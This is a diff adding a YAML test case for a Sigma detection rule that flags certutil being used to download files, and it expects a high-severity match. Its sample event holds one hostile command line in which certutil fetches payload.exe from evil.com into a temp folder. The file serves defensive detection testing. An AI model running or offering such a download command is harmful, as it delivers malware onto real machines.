@@ -1,0 +1,19 @@
+test_case:
+  name: "Certutil File Download"
+  description: "Tests detection of certutil abuse for file download"
+  rule: "execution/certutil_download.yml"
+  rule_type: sigma
+  events:
+    - type: process_create
+      os_type: windows
+      data:
+        path: "C:\\Windows\\System32\\certutil.exe"
+        cmdline: "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\payload.exe"
+        parent_path: "C:\\Windows\\System32\\cmd.exe"
+        user: "WORKSTATION\\user"
+        pid: 8456
+        ppid: 2048
+  expected: match
+  expected_severity: high
+  expected_mitre: ["T1105"]
+  tags: ["execution", "certutil", "positive"]
